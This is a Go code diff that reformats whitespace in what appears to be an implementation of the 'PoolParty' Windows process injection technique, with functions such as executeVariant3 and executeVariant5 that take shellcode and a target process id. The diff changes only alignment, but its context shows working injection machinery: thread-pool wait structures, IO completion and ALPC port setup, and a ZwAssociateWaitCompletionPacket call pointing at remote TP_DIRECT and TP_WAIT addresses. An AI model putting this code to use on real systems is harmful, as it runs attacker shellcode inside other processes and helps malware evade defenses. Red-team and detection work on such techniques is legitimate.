@@ -277,14 +277,14 @@ type T2_SET_PARAMETERS struct {
 
 // FULL_TP_WAIT structure - for variant 3
 type FULL_TP_WAIT struct {
-	Timer          FULL_TP_TIMER
-	Handle         uintptr
-	WaitPkt        uintptr
-	NextWaitHandle uintptr
+	Timer           FULL_TP_TIMER
+	Handle          uintptr
+	WaitPkt         uintptr
+	NextWaitHandle  uintptr
 	NextWaitTimeout int64 // LARGE_INTEGER
-	Direct         TP_DIRECT
-	WaitFlags      uint8
-	_              [7]byte // padding
+	Direct          TP_DIRECT
+	WaitFlags       uint8
+	_               [7]byte // padding
 }
 
 // FULL_TP_IO structure - for variant 4
@@ -330,16 +330,16 @@ type JOBOBJECT_ASSOCIATE_COMPLETION_PORT struct {
 
 // ALPC_PORT_ATTRIBUTES structure - for variant 5
 type ALPC_PORT_ATTRIBUTES struct {
-	Flags                uint32
-	SecurityQos          [12]byte // SECURITY_QUALITY_OF_SERVICE
-	MaxMessageLength     uint64
-	MemoryBandwidth      uint64
-	MaxPoolUsage         uint64
-	MaxSectionSize       uint64
-	MaxViewSize          uint64
-	MaxTotalSectionSize  uint64
-	DupObjectTypes       uint32
-	Reserved             uint32
+	Flags               uint32
+	SecurityQos         [12]byte // SECURITY_QUALITY_OF_SERVICE
+	MaxMessageLength    uint64
+	MemoryBandwidth     uint64
+	MaxPoolUsage        uint64
+	MaxSectionSize      uint64
+	MaxViewSize         uint64
+	MaxTotalSectionSize uint64
+	DupObjectTypes      uint32
+	Reserved            uint32
 }
 
 // ALPC_PORT_ASSOCIATE_COMPLETION_PORT structure - for variant 5
@@ -356,8 +356,8 @@ type PORT_MESSAGE struct {
 	DataInfoOffset uint16
 	ClientId       [16]byte // CLIENT_ID (two uintptrs)
 	MessageId      uint32
-	_              [4]byte  // padding for 8-byte alignment
-	ClientViewSize uintptr  // SIZE_T (union with CallbackId, takes larger size)
+	_              [4]byte // padding for 8-byte alignment
+	ClientViewSize uintptr // SIZE_T (union with CallbackId, takes larger size)
 }
 
 // ALPC_MESSAGE structure - for variant 5
@@ -424,12 +424,12 @@ var (
 // Constants for new variants
 const (
 	// File creation flags
-	FILE_FLAG_OVERLAPPED   = 0x40000000
-	FILE_ATTRIBUTE_NORMAL  = 0x00000080
-	CREATE_ALWAYS          = 2
-	GENERIC_WRITE          = 0x40000000
-	FILE_SHARE_READ        = 0x00000001
-	FILE_SHARE_WRITE       = 0x00000002
+	FILE_FLAG_OVERLAPPED  = 0x40000000
+	FILE_ATTRIBUTE_NORMAL = 0x00000080
+	CREATE_ALWAYS         = 2
+	GENERIC_WRITE         = 0x40000000
+	FILE_SHARE_READ       = 0x00000001
+	FILE_SHARE_WRITE      = 0x00000002
 
 	// File info class
 	FileReplaceCompletionInformation = 61
@@ -911,9 +911,9 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 	// Step 9: Create event
 	eventName, _ := windows.UTF16PtrFromString("PoolPartyEvent")
 	hEvent, _, err := procCreateEventW.Call(
-		0,     // Security attributes
-		0,     // Manual reset (FALSE)
-		0,     // Initial state (FALSE)
+		0, // Security attributes
+		0, // Manual reset (FALSE)
+		0, // Initial state (FALSE)
 		uintptr(unsafe.Pointer(eventName)),
 	)
 	if hEvent == 0 {
@@ -924,14 +924,14 @@ func executeVariant3(shellcode []byte, pid uint32) (string, error) {
 
 	// Step 10: Associate event with IO completion port via ZwAssociateWaitCompletionPacket
 	status, _, _ := procZwAssociateWaitCompletionPacket.Call(
-		pWaitStruct.WaitPkt,     // WaitCompletionPacketHandle
-		uintptr(hIoCompletion),  // IoCompletionHandle
-		hEvent,                  // TargetObjectHandle (event)
-		tpDirectAddr,            // KeyContext (remote TP_DIRECT)
-		tpWaitAddr,              // ApcContext (remote TP_WAIT)
-		0,                       // IoStatus
-		0,                       // IoStatusInformation
-		0,                       // AlreadySignaled (NULL)
+		pWaitStruct.WaitPkt,    // WaitCompletionPacketHandle
+		uintptr(hIoCompletion), // IoCompletionHandle
+		hEvent,                 // TargetObjectHandle (event)
+		tpDirectAddr,           // KeyContext (remote TP_DIRECT)
+		tpWaitAddr,             // ApcContext (remote TP_WAIT)
+		0,                      // IoStatus
+		0,                      // IoStatusInformation
+		0,                      // AlreadySignaled (NULL)
 	)
 	if status != 0 {
 		return output, fmt.Errorf("ZwAssociateWaitCompletionPacket failed: 0x%X", status)
@@ -1159,8 +1159,8 @@ func executeVariant5(shellcode []byte, pid uint32) (string, error) {
 	// Create UNICODE_STRING for port name
 	// Length = bytes excluding null terminator, MaximumLength = bytes including null terminator
 	var usPortName UNICODE_STRING
-	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)        // UTF-16 code units (minus null) * 2 bytes each
-	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2)       // Full buffer size in bytes
+	usPortName.Length = uint16((len(portNameUTF16) - 1) * 2)  // UTF-16 code units (minus null) * 2 bytes each
+	usPortName.MaximumLength = uint16(len(portNameUTF16) * 2) // Full buffer size in bytes
 	usPortName.Buffer = &portNameUTF16[0]
 
 	// Step 8: Create the actual ALPC port with attributes
